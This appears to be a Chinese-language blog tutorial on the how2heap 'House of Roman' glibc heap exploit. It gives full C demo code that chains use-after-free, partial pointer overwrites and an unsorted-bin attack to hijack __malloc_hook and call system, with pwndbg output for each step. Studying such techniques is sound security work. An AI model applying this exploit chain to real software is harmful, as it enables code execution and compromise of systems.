---
layout: post
title: how2heap_house_of_roman
published: true
---

## house_of_roman

该程序涉及到的攻击方法可以绕过ASLR，并且没有地方leak libc地址时候。整个程序被分为5个步骤：

```c
int main(){
    init();

// 1
    puts("Step 1: Point fastbin chunk to __malloc_hook\n\n");
    puts("Setting up chunks for relative overwrites with heap feng shui.\n");

    // Use this as the UAF chunk later to edit the heap pointer later to point to the LibC value. 
    uint8_t* fastbin_victim = malloc(0x60); 

    // Allocate this in order to have good alignment for relative 
    // offsets later (only want to overwrite a single byte to prevent 
    // 4 bits of brute on the heap).
    malloc(0x80);

    // Offset 0x100
    uint8_t* main_arena_use = malloc(0x80);

    // Offset 0x190
    // This ptr will be used for a relative offset on the 'main_arena_use' chunk
    uint8_t* relative_offset_heap = malloc(0x60);

    // Free the chunk to put it into the unsorted_bin. 
    // This chunk will have a pointer to main_arena + 0x68 in both the fd and bk pointers.
    free(main_arena_use);

// 2
    puts("Allocate chunk that has a pointer to LibC main_arena inside of fd ptr.\n");
    //Offset 0x100. Has main_arena + 0x68 in fd and bk.
    uint8_t* fake_libc_chunk = malloc(0x60);

    //// NOTE: This is NOT part of the exploit... \\\
    // The __malloc_hook is calculated in order for the offsets to be found so that this exploit works on a handful of versions of GLibC. 
    long long __malloc_hook = ((long*)fake_libc_chunk)[0] - 0xe8;


    // We need the filler because the overwrite below needs 
    // to have a ptr in the fd slot in order to work. 
    //Freeing this chunk puts a chunk in the fd slot of 'fastbin_victim' to be used later. 
    free(relative_offset_heap); 

    puts("\
    Overwrite the first byte of a heap chunk in order to point the fastbin chunk\n\
    to the chunk with the LibC address\n");
    puts("\
    Fastbin 0x70 now looks like this:\n\
    heap_addr -> heap_addr2 -> LibC_main_arena\n");
    fastbin_victim[0] = 0x00; // The location of this is at 0x100. But, we only want to overwrite the first byte. So, we put 0x0 for this.

// 3
    puts("\
    Use a relative overwrite on the main_arena pointer in the fastbin.\n\
    Point this close to __malloc_hook in order to create a fake fastbin chunk\n");
    long long __malloc_hook_adjust = __malloc_hook - 0x23; // We substract 0x23 from the malloc because we want to use a 0x7f as a valid fastbin chunk size.

    // The relative overwrite
    int8_t byte1 = (__malloc_hook_adjust) & 0xff;  
    int8_t byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 
    fake_libc_chunk[0] = byte1; // Least significant bytes of the address.
    fake_libc_chunk[1] = byte2; // The upper most 4 bits of this must be brute forced in a real attack.

    // Two filler chunks prior to the __malloc_hook chunk in the fastbin. 
    // These are fastbin_victim and fake_libc_chunk.
    puts("Get the fake chunk pointing close to __malloc_hook\n");
    puts("\
    In a real exploit, this would fail 15/16 times\n\
    because of the final half byet of the malloc_hook being random\n"); 
    malloc(0x60);
    malloc(0x60);

    // If the 4 bit brute force did not work, this will crash because 
    // of the chunk size not matching the bin for the chunk. 
    // Otherwise, the next step of the attack can begin.
    uint8_t* malloc_hook_chunk = malloc(0x60); 

    puts("Passed step 1 =)\n\n\n");

    puts("\
    Start Step 2: Unsorted_bin attack\n\n\
    The unsorted bin attack gives us the ability to write a\n\
    large value to ANY location. But, we do not control the value\n\
    This value is always main_arena + 0x68. \n\
    We point the unsorted_bin attack to __malloc_hook for a \n\
    relative overwrite later.\n");

// 4
    // Get the chunk to corrupt. Add another ptr in order to prevent consolidation upon freeing.

    uint8_t* unsorted_bin_ptr = malloc(0x80); 
    malloc(0x30); // Don't want to consolidate

    puts("Put chunk into unsorted_bin\n");
    // Free the chunk to create the UAF
    free(unsorted_bin_ptr);

    /* /// NOTE: The last 4 bits of byte2 would have been brute forced earlier. \\\ 
    However, for the sake of example, this has been calculated dynamically. 
    */
    __malloc_hook_adjust = __malloc_hook - 0x10; // This subtract 0x10 is needed because of the chunk->fd doing the actual overwrite on the unsorted_bin attack.
    byte1 = (__malloc_hook_adjust) & 0xff;  
    byte2 = (__malloc_hook_adjust & 0xff00) >> 8; 


    // Use another relative offset to overwrite the ptr of the chunk->bk pointer.
    // From the previous brute force (4 bits from before) we 
    // know where the location of this is at. It is 5 bytes away from __malloc_hook.
    puts("Overwrite last two bytes of the chunk to point to __malloc_hook\n");
    unsorted_bin_ptr[8] = byte1; // Byte 0 of bk.  

    // //// NOTE: Normally, the second half of the byte would HAVE to be brute forced. However, for the sake of example, we set this in order to make the exploit consistent. ///
    unsorted_bin_ptr[9] = byte2; // Byte 1 of bk. The second 4 bits of this was brute forced earlier, the first 4 bits are static.

    puts("Trigger the unsorted_bin attack\n");
    malloc(0x80); // Trigger the unsorted_bin attack to overwrite __malloc_hook with main_arena + 0x68

    long long system_addr = (long long)dlsym(RTLD_NEXT, "system");

    puts("Passed step 2 =)\n\n\n");
    /* 
    Step 3: Set __malloc_hook to system

    The chunk itself is allocated 19 bytes away from __malloc_hook. 
    So, we use a realtive overwrite (again) in order to partially overwrite 
    the main_arena pointer (from unsorted_bin attack) to point to system.

    In a real attack, the first 12 bits are static (per version). 
    But, after that, the next 12 bits must be brute forced. 

    /// NOTE: For the sake of example, we will be setting these values, instead of brute forcing them. \\\
    */ 
// 5
    puts("Step 3: Set __malloc_hook to system/one_gadget\n\n");
    puts("\
    Now that we have a pointer to LibC inside of __malloc_hook (from step 2), \n\
    we can use a relative overwrite to point this to system or a one_gadget.\n\
    Note: In a real attack, this would be where the last 8 bits of brute forcing\n\
    comes from.\n");
    malloc_hook_chunk[19] = system_addr & 0xff; // The first 12 bits are static (per version).

    malloc_hook_chunk[20] = (system_addr >> 8) & 0xff;  // The last 4 bits of this must be brute forced (done previously already).
    malloc_hook_chunk[21] = (system_addr >> 16) & 0xff;  // The last byte is the remaining 8 bits that must be brute forced.
    malloc_hook_chunk[22] = (system_addr >> 24) & 0xff; // If the gap is between the data and text section is super wide, this is also needed. Just putting this in to be safe.

    puts("Pop Shell!");
    malloc((long long)shell);
}
```

第一步主要准备好之后要利用的几个chunk，free了其中一个插入unsortedbin。

```bash
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x603000
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x603070
Size: 0x91

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x603100
Size: 0x91
fd: 0x7ffff7bcdb78
bk: 0x7ffff7bcdb78

Allocated chunk
Addr: 0x603190
Size: 0x70

Top chunk | PREV_INUSE
Addr: 0x603200
Size: 0x20e01
```

第二步通过UAF来获取libc地址

```bash
pwndbg> x/4gx fake_libc_chunk 
0x603110: 0x00007ffff7bcdbf8 0x00007ffff7bcdbf8
0x603120: 0x0000000000000000 0x0000000000000000
```

然后通过两次free在fastbin 0x70的位置插入两个chunk，这步是为了将`fake_libc_chunk`插入fastbin做准备。

```bash
pwndbg> x/x __malloc_hook
0x7ffff7bcdb10 <__malloc_hook>: 0x0000000000000000
```

```bash
pwndbg> fastbins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x603000 —▸ 0x603190 ◂— 0x0
```

此时bin的布局如下：

```bash
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x603000 —▸ 0x603190 ◂— 0x0
0x80: 0x0
unsortedbin
all: 0x603170 —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x603170 /* 'p1`' */
smallbins
empty
largebins
```

通过修改`fastbin_victim->fd`的低字节，把`fake_libc_chunk`插入fastbin：

```bash
pwndbg> x/x fake_libc_chunk 
0x603110: 0x00007ffff7bcdbf8

pwndbg> x/x fastbin_victim 
0x603010: 0x0000000000603190

pwndbg> fastbins 
fastbins
...
0x60: 0x0
0x70: 0x603000 —▸ 0x603100 —▸ 0x7ffff7bcdbf8 (main_arena+216) ◂— 0x7ffff7bcdbf8
```

第三步，获取`malloc_hook - 0x23`的位置，因为这里可以构成一个`0x7f`大小的chunk，为了之后链入fastbin。

```bash
pwndbg> x/4gx __malloc_hook - 0x23
0x7ffff7bcdaed <_IO_wide_data_0+301>: 0xfff7bcc260000000 0x000000000000007f
0x7ffff7bcdafd: 0xfff788eea0000000 0xfff788ea7000007f
```

使`fake_libc_chunk[0]`指向`__malloc_hook_adjust`，修改低2个字节，其中`db`中的`b`真实情况下需要brute force，1/16成功率。

```bash
#修改前：
pwndbg> x/x __malloc_hook_adjust 
0x7ffff7bcdaed <_IO_wide_data_0+301>: 0xfff7bcc260000000
pwndbg> x/4gx fake_libc_chunk 
0x603110: 0x00007ffff7bcdbf8 0x00007ffff7bcdbf8

#修改后：
pwndbg> x/4gx fake_libc_chunk 
0x603110: 0x00007ffff7bcdaed 0x00007ffff7bcdbf8
```

此时，`malloc_hook_chunk`已被链入fastbin。经过malloc两次，第三次取出刚才伪造的chunk：

```bash
pwndbg> x/4gx malloc_hook_chunk - 0x10
0x7ffff7bcdaed <_IO_wide_data_0+301>: 0xfff7bcc260000000 0x000000000000007f
0x7ffff7bcdafd: 0xfff788eea0000000 0xfff788ea7000007f
```

第四步主要是通过unsortedbin attack来改写`malloc_hook`，使其指向`main_arena+88`。因为`system`地址与`main_arena+88`只有最开始的12个bit有差别，所以先获取大致的地址，后续再通过`malloc_hook_chunk`来改写这12bit。

```bash
pwndbg> x/4gx unsorted_bin_ptr - 0x10
0x603200: 0x0000000000000000 0x0000000000000091
0x603210: 0x0000000000000000 0x0000000000000000

# After free
unsortedbin
all: 0x603200 —▸ 0x7ffff7bcdb78 (main_arena+88) ◂— 0x603200
```

获取`__malloc_hook - 0x10`的地址，插入`unsorted_bin_ptr->bk`的位置。

```bash
pwndbg> x/2gx unsorted_bin_ptr 
0x603210: 0x00007ffff7bcdb78 0x00007ffff7bcdb00
```

malloc后`__malloc_hook`指向`main_arena+88`即`0x00007ffff7bcdb78`的位置。

```bash
pwndbg> x/x __malloc_hook
0x7ffff7bcdb10 <__malloc_hook>: 0x00007ffff7bcdb78"
```

最后，由于`__malloc_hook_chunk`和`__malloc_hook`目前是重叠的两块内存，所以可以通过修改`__malloc_hook_chunk`来修改`__malloc_hook`的地址，使其指向one_gadget。

```bash
pwndbg> p/x system_addr 
$2 = 0x7ffff784e3a0

pwndbg> x/10gx malloc_hook_chunk
0x7ffff7bcdafd: 0xfff788eea0000000 0xfff788ea7000007f
0x7ffff7bcdb0d <__realloc_hook+5>: 0xfff784e3a000007f 0x000000000000007f

pwndbg> x/x __malloc_hook
0x7ffff7bcdb10 <__malloc_hook>: 0x00007ffff784e3a0
```

最后调用malloc触发`malloc_hook`，调用system函数。

### Reference

[house_of_roman](https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc#assumptions)

[house_or_roman实战](https://xz.aliyun.com/t/2316?accounttraceid=94383719cb32496fa0a95c7268cdf46adyzp)